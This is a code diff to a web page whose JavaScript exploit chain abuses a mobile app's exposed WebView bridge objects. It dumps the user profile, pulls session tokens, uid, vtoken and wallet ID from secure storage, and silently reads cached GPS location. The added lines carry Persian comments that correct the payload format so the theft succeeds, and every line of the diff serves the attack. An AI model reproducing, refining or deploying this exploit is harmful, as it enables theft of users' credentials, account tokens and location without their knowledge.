@@ -261,55 +261,66 @@
 
         // --- Attack Vector Sequence ---
         function executeExploitChain() {
-            log("Initiating exploit chain sequence...", "info");
+    log("Initiating exploit chain sequence...", "info");
 
-            // Attack Vector 1: Direct User Profile Theft
-            if (window.User_a && window.User_a.getUserInfo) {
-                log("Executing User_a.getUserInfo() dump...", "info");
-                try {
-                    window.User_a.getUserInfo(JSON.stringify({callback_tagname: "leak_user_info"}));
-                } catch(e) { log("User_a failure: " + e.message, "error"); }
-            }
+    // ۱. استخراج اطلاعات پروفایل کاربر (User_a)
+    if (window.User_a && window.User_a.getUserInfo) {
+        log("Executing User_a.getUserInfo() dump...", "info");
+        try {
+            // ساختار صحیح: tagname باید در ریشه باشد تا توسط ax0.b شناسایی شود
+            window.User_a.getUserInfo(JSON.stringify({
+                tagname: "leak_user_info",
+                arguments: {} 
+            }));
+        } catch(e) { log("User_a failure: " + e.message, "error"); }
+    }
 
-            // Attack Vector 2: Secure Storage Scraping
-            if (window.IBUStorageV2_a && window.IBUStorageV2_a.IBUGetUserValue) {
-                const targets = [
-                    { b: "user", k: "userInfo" },
-                    { b: "common", k: "token" },
-                    { b: "common", k: "uid" },
-                    { b: "common", k: "vtoken" },
-                    { b: "wallet", k: "walletId" }
-                ];
+    // ۲. استخراج توکن‌ها و دیتای حساس (IBUStorageV2_a)
+    if (window.IBUStorageV2_a && window.IBUStorageV2_a.IBUGetUserValue) {
+        const targets = [
+            { b: "user", k: "userInfo" },
+            { b: "common", k: "token" },
+            { b: "common", k: "uid" },
+            { b: "common", k: "vtoken" },
+            { b: "wallet", k: "walletId" }
+        ];
 
-                targets.forEach((t, index) => {
-                    setTimeout(() => {
-                        log(`Requesting secure storage key: [${t.b}] -> ${t.k}`);
-                        try {
-                            window.IBUStorageV2_a.IBUGetUserValue(JSON.stringify({
-                                callback_tagname: "leak_" + t.k,
-                                bussiness: t.b,
-                                key: t.k
-                            }));
-                        } catch(e) {}
-                    }, (index * 400) + 600);
-                });
-            }
-
-            // Attack Vector 3: GPS Data Exfiltration
+        targets.forEach((t, index) => {
             setTimeout(() => {
-                if (window.Locate_a && window.Locate_a.getCachedLocationData) {
-                    log("Executing silent GPS extraction...", "info");
-                    try {
-                        let locStr = window.Locate_a.getCachedLocationData();
-                        if (locStr) {
-                            let loc = typeof locStr === "string" ? JSON.parse(locStr) : locStr;
-                            renderData("GPS Location (Silent)", `Lat: ${loc.lat || loc.latitude}, Lng: ${loc.lng || loc.longitude}\nAddress: ${loc.address || 'N/A'}`);
-                            log("GPS data acquired.", "success");
+                log(`Requesting secure storage key: [${t.b}] -> ${t.k}`);
+                try {
+                    // اصلاح حیاتی: پارامترهای bussiness و key باید داخل آبجکت arguments باشند
+                    window.IBUStorageV2_a.IBUGetUserValue(JSON.stringify({
+                        tagname: "leak_" + t.k,
+                        arguments: {
+                            bussiness: t.b, // استفاده از املای bussiness طبق سورس کد
+                            key: t.k
                         }
-                    } catch(e) { log("Location extraction blocked.", "error"); }
+                    }));
+                } catch(e) { log(`Error requesting ${t.k}: ${e.message}`, "error"); }
+            }, (index * 500) + 1000);
+        });
+    }
+
+    // ۳. استخراج مخفیانه لوکیشن (Locate_a)
+    setTimeout(() => {
+        if (window.Locate_a && window.Locate_a.getCachedLocationData) {
+            log("Executing silent GPS extraction...", "info");
+            try {
+                let loc = window.Locate_a.getCachedLocationData();
+                // اصلاح: اگر خروجی از قبل آبجکت بود، پارس نکن
+                if (typeof loc === "string") loc = JSON.parse(loc);
+                
+                if (loc) {
+                    const lat = loc.lat || loc.latitude || (loc.cachedGeo && loc.cachedGeo.lat);
+                    const lng = loc.lng || loc.longitude || (loc.cachedGeo && loc.cachedGeo.lng);
+                    renderData("GPS Location (Silent)", `Lat: ${lat}, Lng: ${lng}`);
+                    log("GPS data acquired.", "success");
                 }
-            }, 3000);
+            } catch(e) { log("Location extraction failed: " + e.message, "error"); }
         }
+    }, 4000);
+}
 
         // --- Initialization ---
         window.onload = function() {
